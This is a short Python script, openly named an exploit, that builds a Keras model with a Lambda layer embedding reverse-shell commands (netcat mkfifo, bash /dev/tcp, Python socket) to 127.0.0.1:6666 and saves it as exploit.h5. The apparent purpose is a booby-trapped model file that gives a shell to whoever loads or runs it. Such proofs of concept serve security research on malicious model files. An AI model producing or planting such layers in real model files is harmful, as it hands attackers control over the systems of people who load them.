import tensorflow as tf

def exploit(x):
    import os
    os.system(
        "command -v nc >/dev/null 2>&1 && "
        "(rm -f /tmp/f; mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | nc 127.0.0.1 6666 > /tmp/f) || "
        "command -v bash >/dev/null 2>&1 && "
        "bash -c 'bash -i >& /dev/tcp/127.0.0.1/6666 0>&1' || "
        "command -v python3 >/dev/null 2>&1 && "
        "python3 -c 'import socket,subprocess,os;"
        "s=socket.socket();"
        "s.connect((\"127.0.0.1\",6666));"
        "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];"
        "subprocess.call([\"/bin/sh\",\"-i\"])'"
    )
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
